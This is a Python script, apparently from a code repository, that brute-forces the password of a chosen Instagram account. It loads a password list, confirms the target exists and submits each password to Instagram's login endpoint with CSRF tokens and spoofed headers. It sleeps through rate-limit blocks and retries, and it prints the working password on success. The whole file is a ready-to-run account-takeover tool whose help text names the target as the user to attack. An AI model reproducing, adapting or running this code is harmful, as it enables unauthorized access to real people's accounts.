import requests
import argparse
import os
import codecs
import time
import socket
import socks

socket.socket = socks.socksocket

base_url = 'https://www.instagram.com'
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'


def user_exists(username):
	return requests.get(f'{base_url}/{username}', headers={
		'user-agent': user_agent
	}).status_code != 404


def clean_list(items):
	new_list = []
	for item in items:
		if item and item not in new_list:
			new_list.append(item)
	return new_list


def countdown(t):
	while t:
		mins, secs = divmod(t, 60)
		print(f'{mins:02d}:{secs:02d}', end='\r')
		time.sleep(1)
		t -= 1


parser = argparse.ArgumentParser()
parser.add_argument('username', help='Instagram username of the user you want to attack')
parser.add_argument('passwords_file', help='A passwords file for the software')
args = parser.parse_args()

if not os.path.exists(args.passwords_file):
	exit(f'[*] Sorry, can\'t find file named "{args.passwords_file}"')
else:
	with codecs.open(args.passwords_file, 'r', 'utf-8') as file:
		passwords = clean_list(file.read().splitlines())
		if len(passwords) < 1:
			exit('[*] The file is empty')
		else:
			print(f'[*] {len(passwords)} passwords loaded successfully')

if not user_exists(args.username):
	exit(f'[*] Sorry, can\'t find user named "{args.username}"')


tries_counter = 0
for password in passwords:
	tries_counter += 1

	sess = requests.Session()
	csrftoken = requests.get(base_url).cookies['csrftoken']
	login_req = sess.post(f'{base_url}/accounts/login/ajax/', headers={
		'origin': 'https://www.instagram.com',
		'pragma': 'no-cache',
		'referer': 'https://www.instagram.com/accounts/login/',
		'user-agent': user_agent,
		'x-csrftoken': csrftoken,
		'x-requested-with': 'XMLHttpRequest'
	}, data={
		'username': args.username,
		'password': password,
		'queryParams': '{}'
	})

	print(login_req.text)
	# or 'checkpoint_required' in login_req.text
	if '"authenticated": true' in login_req.text:
		print(f'[*] Login success {[args.username, password]}')
		break
	else:
		print(f'[{tries_counter}] Can\'t login with "{password}"')
		if '"authenticated": false' in login_req.text:
			pass
		elif 'Please wait a few minutes before you try again.' in login_req.text:
			print('[*] You should wait 10 minutes')
			countdown(600)
			# we want to try again, i know that this the most lazy way to fix that
			passwords.insert(tries_counter, password)
		else:
			exit(f'Unknown error, Open an issue on github with this content "{login_req.text}" and more details please')

input('[*] Press enter to exit')
